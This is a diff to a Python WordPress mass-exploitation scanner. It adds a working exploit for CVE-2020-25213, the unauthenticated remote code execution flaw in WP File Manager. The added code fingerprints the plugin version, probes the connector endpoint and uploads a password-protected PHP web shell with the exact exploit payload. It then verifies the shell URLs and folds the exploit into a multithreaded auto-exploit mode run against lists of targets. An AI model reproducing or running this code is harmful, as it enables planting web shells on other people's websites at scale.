@@ -230,7 +230,147 @@ class WPFileManagerExploit:
             pass
         return False, None
     
+    def check_version_cve_2020_25213(self, target_url):
+        """Check wp-file-manager version for CVE-2020-25213"""
+        readme_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/readme.txt')
+        
+        try:
+            response = self.session.get(readme_url, timeout=5)
+            if response.status_code == 200:
+                version_match = re.search(r'== Changelog ==.*?(\d+\.\d+)', response.text, re.DOTALL)
+                if version_match:
+                    version = version_match.group(1)
+                    print(f"    [+] Found wp-file-manager version: {version}")
+                    
+                    try:
+                        version_parts = version.split('.')
+                        version_float = float(f"{version_parts[0]}.{version_parts[1]}")
+                        
+                        if 6.0 <= version_float <= 6.8:
+                            print(f"    [+] Version {version} is vulnerable to CVE-2020-25213")
+                            return True
+                        else:
+                            print(f"    [-] Version {version} is not vulnerable (requires 6.0-6.8)")
+                            return False
+                    except:
+                        print(f"    [-] Unable to parse version number")
+                        return None
+                else:
+                    print(f"    [-] Unable to detect version")
+                    return None
+            else:
+                return None
+        except Exception as e:
+            return None
+    
+    def exploit_cve_2020_25213(self, target_url, auto_shell=True):
+        """
+        CVE-2020-25213: WP File Manager 6.0-6.8 Unauthenticated RCE
+        Original exploit by Mansoor R (@time4ster)
+        """
+        print(f"\n  {CYAN}[*]{RESET} Testing CVE-2020-25213 (WP File Manager RCE)...")
+        
+        # First check version
+        print(f"    {CYAN}[*]{RESET} Checking plugin version...")
+        version_vuln = self.check_version_cve_2020_25213(target_url)
+        
+        endpoint_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php')
+        
+        # Check if endpoint is vulnerable
+        try:
+            check_response = self.session.get(endpoint_url, timeout=5)
+            if check_response.status_code == 200:
+                try:
+                    json_response = check_response.json()
+                    if 'error' in json_response and 'errUnknownCmd' in str(json_response['error']):
+                        print(f"    {GREEN}[+]{RESET} Target vulnerable to CVE-2020-25213")
+                    else:
+                        print(f"    {RED}[-]{RESET} Target not vulnerable to CVE-2020-25213")
+                        return False, "Not vulnerable to CVE-2020-25213"
+                except:
+                    print(f"    {RED}[-]{RESET} Target not vulnerable to CVE-2020-25213")
+                    return False, "Not vulnerable to CVE-2020-25213"
+            else:
+                print(f"    {RED}[-]{RESET} Endpoint not accessible")
+                return False, "Endpoint not accessible"
+        except Exception as e:
+            print(f"    {RED}[-]{RESET} Error checking vulnerability: {str(e)}")
+            return False, f"Error: {str(e)}"
+        
+        # If auto_shell, upload a shell using the exact exploit payload
+        if auto_shell:
+            print(f"    {CYAN}[*]{RESET} Uploading shell via CVE-2020-25213...")
+            shell_name = f"cve_shell_{random.randint(1000, 9999)}.php"
+            
+            # Create temporary file with shell content
+            temp_shell = f"/tmp/{shell_name}"
+            try:
+                with open(temp_shell, 'w') as f:
+                    f.write(SHELL_CONTENT)
+                
+                # Exact payload from the bash exploit
+                files = {
+                    'upload[]': (shell_name, open(temp_shell, 'rb'), 'application/x-php')
+                }
+                
+                data = {
+                    'reqid': '17457a1fe6959',
+                    'cmd': 'upload',
+                    'target': 'l1_Lw',
+                    'mtime[]': '1576045135'
+                }
+                
+                headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+                
+                exploit_response = self.session.post(endpoint_url, files=files, data=data, headers=headers, timeout=10)
+                
+                # Clean up temp file
+                os.remove(temp_shell)
+                
+                if exploit_response.status_code == 200:
+                    try:
+                        json_response = exploit_response.json()
+                        if 'added' in json_response and len(json_response['added']) > 0:
+                            shell_path = json_response['added'][0].get('url')
+                            if shell_path:
+                                full_shell_url = urljoin(target_url, shell_path)
+                                if self.verify_shell(full_shell_url):
+                                    print(f"    {GREEN}[SHELL]{RESET} CVE-2020-25213 Shell uploaded: {full_shell_url}?p={SHELL_PASSWORD}")
+                                    return True, f"CVE-2020-25213 Shell: {full_shell_url}?p={SHELL_PASSWORD}"
+                    except:
+                        # Try alternative path
+                        alt_url = urljoin(target_url, f'wp-content/plugins/wp-file-manager/lib/files/{shell_name}')
+                        if self.verify_shell(alt_url):
+                            print(f"    {GREEN}[SHELL]{RESET} CVE-2020-25213 Shell uploaded: {alt_url}?p={SHELL_PASSWORD}")
+                            return True, f"CVE-2020-25213 Shell: {alt_url}?p={SHELL_PASSWORD}"
+                        
+                        # Check if shell.php was uploaded
+                        shell_url = urljoin(target_url, 'wp-content/plugins/wp-file-manager/lib/php/../files/shell.php')
+                        if self.verify_shell(shell_url):
+                            print(f"    {GREEN}[SHELL]{RESET} CVE-2020-25213 Shell uploaded: {shell_url}?p={SHELL_PASSWORD}")
+                            return True, f"CVE-2020-25213 Shell: {shell_url}?p={SHELL_PASSWORD}"
+                
+                print(f"    {RED}[-]{RESET} CVE-2020-25213 exploit failed")
+                return False, "Exploit failed"
+                
+            except Exception as e:
+                if os.path.exists(f"/tmp/{shell_name}"):
+                    os.remove(f"/tmp/{shell_name}")
+                print(f"    {RED}[-]{RESET} CVE-2020-25213 error: {str(e)}")
+                return False, f"Error: {str(e)}"
+        
+        return True, "Target vulnerable to CVE-2020-25213"
+    
     def exploit_wp_file_manager(self, target_url):
+        # First try the specific CVE-2020-25213 exploit
+        success, msg = self.exploit_cve_2020_25213(target_url, auto_shell=True)
+        if success:
+            return success, msg
+        
+        # Fall back to original exploit method
         exploit_paths = [
             'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',
             'wp-content/plugins/wp-file-manager/lib/php/connector.php'
@@ -494,6 +634,7 @@ class WPFileManagerExploit:
             'ajax_search': False,
             'revslider': False,
             'brute_upload': False,
+            'cve_2020_25213': False,
             'shell_urls': [],
             'details': []
         }
@@ -504,6 +645,16 @@ class WPFileManagerExploit:
             results['details'].append(f"Writable directories: {', '.join(writable_dirs)}")
         if found_shells:
             results['shell_urls'].extend(found_shells)
+        
+        # Test CVE-2020-25213 specifically
+        print(f"{CYAN}[*]{RESET} Testing CVE-2020-25213 (WP File Manager RCE)...")
+        cve_result, cve_msg = self.exploit_cve_2020_25213(target_url, auto_shell=True)
+        results['cve_2020_25213'] = cve_result
+        results['details'].append(f"[CVE-2020-25213] {cve_msg}")
+        if cve_result and "Shell" in cve_msg:
+            shell_part = cve_msg.split(': ')[1] if ': ' in cve_msg else cve_msg
+            if shell_part not in results['shell_urls']:
+                results['shell_urls'].append(shell_part)
         
         print(f"{CYAN}[*]{RESET} Testing WP File Manager exploit...")
         fm_result, fm_msg = self.exploit_wp_file_manager(target_url)
@@ -541,7 +692,7 @@ class WPFileManagerExploit:
             if shell_part not in results['shell_urls']:
                 results['shell_urls'].append(shell_part)
         
-        if not any([fm_result, ajax_result, rev_result, brute_result]):
+        if not any([fm_result, ajax_result, rev_result, brute_result, cve_result]):
             results['details'].append("All exploit attempts failed")
         
         return results
@@ -659,6 +810,15 @@ def scan_single_target(target_url, exploit=False):
         if exploit:
             exploiter = WPFileManagerExploit()
             
+            # Try CVE-2020-25213 first
+            print(f"{CYAN}[*]{RESET} Testing CVE-2020-25213 (most reliable)...")
+            cve_success, cve_msg = exploiter.exploit_cve_2020_25213(target_url, auto_shell=True)
+            if cve_success and "Shell" in cve_msg:
+                shell_url = cve_msg.split(': ')[1] if ': ' in cve_msg else cve_msg
+                if shell_url not in result['shell_urls']:
+                    result['shell_urls'].append(shell_url)
+                print(f"  {GREEN}[SHELL]{RESET} {cve_msg}")
+            
             if plugin_results:
                 print(f"{CYAN}[*]{RESET} Attempting to exploit found plugins...")
                 for plugin in plugin_results:
@@ -699,7 +859,7 @@ def mass_scan_targets(targets, max_workers=30, exploit=False):
     
     print(f"\n{BLUE}[*]{RESET} Starting WP Exploit Scanner for {CYAN}{total}{RESET} targets")
     if exploit:
-        print(f"{RED}[!]{RESET} AUTO EXPLOIT MODE ENABLED")
+        print(f"{RED}[!]{RESET} AUTO EXPLOIT MODE ENABLED (Including CVE-2020-25213)")
     
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         future_to_target = {executor.submit(scan_single_target, target, exploit): target for target in targets}
@@ -780,7 +940,7 @@ def save_results(results, filename="wp_exploit_results.txt"):
     try:
         with open(filename, 'w', encoding='utf-8') as f:
             f.write("=" * 100 + "\n")
-            f.write("WORDPRESS EXPLOIT SCANNER RESULTS\n")
+            f.write("WORDPRESS EXPLOIT SCANNER RESULTS (Including CVE-2020-25213)\n")
             f.write("=" * 100 + "\n\n")
             
             wp_count = len([r for r in results if r['is_wordpress']])
@@ -833,7 +993,7 @@ def main():
 ╚███╔███╔╝██║         ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
  ╚══╝╚══╝ ╚═╝         ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                             
-                           FILE MANAGER EXPLOIT SCANNER
+                   FILE MANAGER EXPLOIT SCANNER + CVE-2020-25213
 {RESET}
 """
     
@@ -863,7 +1023,7 @@ def main():
     
     print(f"{BLUE}[*]{RESET} Starting scan with {CYAN}{max_workers}{RESET} threads...")
     if exploit:
-        print(f"{RED}[!]{RESET} AUTO EXPLOIT ENABLED")
+        print(f"{RED}[!]{RESET} AUTO EXPLOIT ENABLED (CVE-2020-25213 + others)")
         print(f"{YELLOW}[!]{RESET} Use only on authorized targets")
     print(f"{YELLOW}[!]{RESET} Press Ctrl+C to stop")
     
